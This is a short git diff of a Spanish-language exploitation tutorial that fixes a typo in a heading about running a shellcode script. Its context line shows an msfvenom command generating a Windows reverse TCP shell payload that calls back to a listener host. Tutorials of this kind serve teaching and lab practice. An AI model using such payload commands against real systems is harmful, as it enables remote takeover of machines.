@@ -441,7 +441,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.137 LPORT=4444 EXITFUNC=th
 <img width="1081" height="672" alt="image" src="https://github.com/user-attachments/assets/854abb3f-3c8b-44f5-b63b-890fd62bc261" />
 
 
-### Ejeciución del script
+### Ejecución del script
 
 Ejecutamos el script **Python3Shellcode.py** agregando nuestro shellcode al script mientras ejecutamos:
 
